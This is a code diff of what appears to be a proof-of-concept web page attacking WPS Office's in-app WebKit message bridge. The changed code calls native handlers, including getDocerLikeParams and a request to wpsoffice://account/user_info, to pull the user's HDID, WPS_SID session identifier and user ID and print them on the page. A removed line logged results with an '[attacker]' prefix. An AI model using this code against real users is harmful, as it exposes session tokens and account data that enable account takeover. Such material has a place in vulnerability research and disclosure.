@@ -80,7 +80,7 @@
         
 
     window.docerLikeParamsCallback = function (res){
-        var json = JSON.parse(res);
+        var json = res;
         document.getElementById("HDID").innerText = "Your HDID: \n" + json.hdid;
         document.getElementById("WPS_SID").innerText = "Your WPS_SID: \n" + json.wps_sid;
         document.getElementById("UserID").innerText = "Your UserID: \n" + json.userId;
@@ -89,12 +89,16 @@
     }
     window.webkit.messageHandlers.getDocerLikeParams.postMessage({});
 
-
-
     window.wpsEventHandler.callbackEncode = function (callbackID, res){
-        result = JSON.stringify(res);
-        console.log("[attacker]:" + result);
+        var json = JSON.parse(decodeURIComponent(atob(res)));
+
+
     }
+    window.webkit.messageHandlers.handleReq.postMessage({ 
+        "url": "wpsoffice://account/user_info", 
+        "params": {}, 
+        "callBackName": "callback_wpsoffice_account_user_info" 
+    });
 
     
 
